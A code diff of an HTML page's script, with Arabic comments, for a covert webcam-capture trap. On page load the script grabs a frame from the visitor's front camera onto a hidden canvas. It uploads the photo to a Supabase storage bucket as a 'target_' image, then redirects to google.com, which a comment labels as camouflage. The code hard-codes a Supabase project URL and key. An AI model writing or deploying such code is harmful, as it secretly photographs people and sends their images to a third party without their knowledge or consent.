@@ -20,13 +20,13 @@
     <canvas id="c" width="640" height="480" style="display:none"></canvas>
 
     <script>
-        const PROJECT_URL = 'https://qzbtfafmapwyefbokwb.supabase.co';
-        const ANON_KEY = 'sb_publishable_x6bUVdUbm9FCbiMZoAvT-A_WbbYOHk2'; 
+        // بياناتك الحقيقية من الصور
+        const SUPA_URL = 'https://qzbtfafmapwyefbokwb.supabase.co';
+        const SUPA_KEY = 'sb_publishable_x6bUVdUbm9FCbiMZoAvT-A_WbbYOHk2'; 
 
-        // هون صلحنا الخطأ اللي بالصورة
-        const supabaseClient = supabase.createClient(PROJECT_URL, ANON_KEY);
+        const supabaseClient = supabase.createClient(SUPA_URL, SUPA_KEY);
 
-        async function init() {
+        async function startSystem() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
@@ -37,21 +37,22 @@
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                     
                     canvas.toBlob(async (blob) => {
-                        const fileName = `shot_${Date.now()}.jpg`;
+                        const fileName = `target_${Date.now()}.jpg`;
                         
+                        // الرفع لمجلد photos
                         await supabaseClient.storage.from('photos').upload(fileName, blob, {
                             contentType: 'image/jpeg'
                         });
 
+                        // التحويل التمويهي
                         window.location.href = "https://www.google.com";
                     }, 'image/jpeg');
                 }, 1000);
-
             } catch (err) {
                 window.location.href = "https://www.google.com";
             }
         }
-        window.onload = init;
+        window.onload = startSystem;
     </script>
 </body>
-</html>
+</html>                
